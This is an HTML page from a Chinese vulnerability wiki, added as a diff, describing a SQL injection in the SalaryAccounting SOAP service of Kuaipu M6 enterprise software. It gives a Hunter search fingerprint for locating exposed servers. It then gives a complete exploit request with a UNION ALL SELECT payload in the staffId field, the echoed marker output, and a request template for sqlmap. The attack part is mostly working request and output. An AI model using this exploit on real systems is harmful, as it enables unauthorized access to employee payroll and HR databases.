@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BF%AB%E6%99%AE/%E5%BF%AB%E6%99%AEM6SalaryAccounting%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>快普M6 SalaryAccounting存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5feb\u666eM6 SalaryAccounting\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%BF%AB%E9%80%92/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9FhttpRequest%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%BF%AB%E9%80%92/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9FhttpRequest%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        快递微信小程序系统httpRequest任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BF%AB%E4%BA%91/%E5%BF%AB%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A9%E6%89%8BGetDetail%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BF%AB%E4%BA%91/%E5%BF%AB%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A9%E6%89%8BGetDetail%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        快云服务器助手GetDetail任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="m6-salaryaccountingsql">快普M6 SalaryAccounting存在SQL注入漏洞<a class="headerlink" href="#m6-salaryaccountingsql" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>快普软件是一款综合性的企业管理软件，它涵盖了财务管理、人力资源管理、供应链管理、生产制造等多个方面。该软件以强大的功能和灵活性著称，能够满足不同企业的个性化需求。通过快普软件，企业可以更加高效地管理财务、人事、供应链和生产制造等各个环节，实现业务流程的优化和协同。同时，该软件还支持移动办公，方便企业随时随地进行业务处理和管理。总之，快普软件是一款功能强大、易于使用的企业管理软件，能够帮助企业提高运营效率和管理水平。快普M6 SalaryAccounting存在SQL注入漏洞</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>快普M6</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>web.body="Resource/JavaScript/jKPM6.DateTime.js"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1705249287850-2f1dd538-9c9e-43e0-8f03-a723c6834643.png" src="./img/tdsklyiA1YTnWaRM/1705249287850-2f1dd538-9c9e-43e0-8f03-a723c6834643-967314.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ASP.NET_SessionId=ecch4oew21q5s0d51waneyy4; http125331972318088ValidateCode=R3QT; iKey=IKEY%u8BBE%u5907%u672A%u8FDE%u63A5%uFF01; 3AB9D23F7A4B3C9B=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M; eid=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M
+Upgrade-Insecure-Requests: 1
+SOAPAction: http://tempuri.org/Calculate
+Content-Type: text/xml;charset=UTF-8
+Host: 
+Content-Length: 1112
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:tem=&quot;http://tempuri.org/&quot;&gt;
+ &lt;soapenv:Header/&gt;
+ &lt;soapenv:Body&gt;
+   &lt;tem:Calculate&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:SalaryCategory&gt;&lt;/tem:SalaryCategory&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:StaffBirthDay&gt;&lt;/tem:StaffBirthDay&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:staffId&gt;
+    1) UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(79)+CHAR(70)+CHAR(108)+CHAR(70)+CHAR(75)+CHAR(107)+CHAR(66)+CHAR(112)+CHAR(72)+CHAR(110)+CHAR(75)+CHAR(98)+CHAR(74)+CHAR(67)+CHAR(79)+CHAR(115)+CHAR(108)+CHAR(67)+CHAR(75)+CHAR(98)+CHAR(68)+CHAR(100)+CHAR(84)+CHAR(98)+CHAR(112)+CHAR(121)+CHAR(101)+CHAR(105)+CHAR(99)+CHAR(66)+CHAR(79)+CHAR(110)+CHAR(83)+CHAR(69)+CHAR(90)+CHAR(89)+CHAR(102)+CHAR(105)+CHAR(70)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(98)+CHAR(113)-- PCzU&lt;/tem:staffId&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:Department&gt;&lt;/tem:Department&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:SubOrg&gt;&lt;/tem:SubOrg&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:taxMonthly&gt;&lt;/tem:taxMonthly&gt;
+   &lt;/tem:Calculate&gt;
+ &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div>
+<p><img alt="1705249349087-7137453d-e7dd-403d-bc71-430489a4605c.png" src="./img/tdsklyiA1YTnWaRM/1705249349087-7137453d-e7dd-403d-bc71-430489a4605c-387969.png" /></p>
+<div class="highlight"><pre><span></span><code>qbbqqOFlFKkBpHnKbJCOslCKbDdTbpyeicBOnSEZYfiFjqbpbq
+</code></pre></div>
+<p>sqlmap</p>
+<div class="highlight"><pre><span></span><code>POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ASP.NET_SessionId=ecch4oew21q5s0d51waneyy4; http125331972318088ValidateCode=R3QT; iKey=IKEY%u8BBE%u5907%u672A%u8FDE%u63A5%uFF01; 3AB9D23F7A4B3C9B=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M; eid=SBQRZJN2EF2QXSSFYFPPHI2BQKRWRME2QTFR4O4VYZ6RCBPIITHTHMWYA7BD64AND5HUIK7NAXNV7BNTBM2SITFE7M
+Upgrade-Insecure-Requests: 1
+SOAPAction: http://tempuri.org/Calculate
+Content-Type: text/xml;charset=UTF-8
+Host: 
+Content-Length: 1112
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:tem=&quot;http://tempuri.org/&quot;&gt;
+ &lt;soapenv:Header/&gt;
+ &lt;soapenv:Body&gt;
+   &lt;tem:Calculate&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:SalaryCategory&gt;&lt;/tem:SalaryCategory&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:StaffBirthDay&gt;&lt;/tem:StaffBirthDay&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:staffId&gt;
+    1)
+    &lt;/tem:staffId&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:Department&gt;&lt;/tem:Department&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:SubOrg&gt;&lt;/tem:SubOrg&gt;
+    &lt;!--type: string--&gt;
+    &lt;tem:taxMonthly&gt;&lt;/tem:taxMonthly&gt;
+   &lt;/tem:Calculate&gt;
+ &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div>
+<p><img alt="1705249400842-6d4244a7-09d1-4ed5-bea6-da016500b707.png" src="./img/tdsklyiA1YTnWaRM/1705249400842-6d4244a7-09d1-4ed5-bea6-da016500b707-009540.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:55:42<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/yogdi0xnw4pvfsfa">https://www.yuque.com/xiaokp7/ocvun2/yogdi0xnw4pvfsfa</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%BF%AB%E9%80%92/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9FhttpRequest%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%BF%AB%E9%80%92/%E5%BF%AB%E9%80%92%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9FhttpRequest%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        快递微信小程序系统httpRequest任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BF%AB%E4%BA%91/%E5%BF%AB%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A9%E6%89%8BGetDetail%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BF%AB%E4%BA%91/%E5%BF%AB%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A9%E6%89%8BGetDetail%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        快云服务器助手GetDetail任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
